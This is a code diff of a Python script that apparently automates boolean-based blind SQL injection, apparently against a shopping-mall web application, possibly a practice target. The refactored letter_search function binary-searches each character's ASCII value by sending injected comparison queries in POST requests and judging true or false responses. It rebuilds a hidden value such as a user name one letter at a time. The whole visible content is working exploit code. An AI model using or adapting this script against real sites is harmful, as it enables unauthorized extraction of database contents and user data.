@@ -19,20 +19,21 @@ def binary_search(destination,query):
         print(min,max)  
     return min
 
-def user_search(query,length):
-    user_name = ""
-    attack_query = "("+query+") > {}"
+def letter_search(destination,query,length):
+    result = ""
     for i in range(1,length+1):
         min ,max = 32,128
         while(max > min):
             avg = (min+max)//2
-            attack_url = attack_query.format(i,avg)
-            #print(attack_url)
-            if shopping_mall_injection(url,cookies,attack_url)==True:
+            attack_query = query+">{}"
+            attack_query = attack_query.format(i,avg)
+            attack_url = attackQuerys.get_complete_query('test',attack_query)
+            print(attack_url)
+            if destination.send_post_request(attack_url)==True:
                 min = avg+1
             else:
                 max = avg
-        user_name += chr(min)
+            print(min,max)
+        result += chr(min)
         print(f'{i}번째 글자 = {chr(min)}')
-
-    print(user_name)
+    print(result)
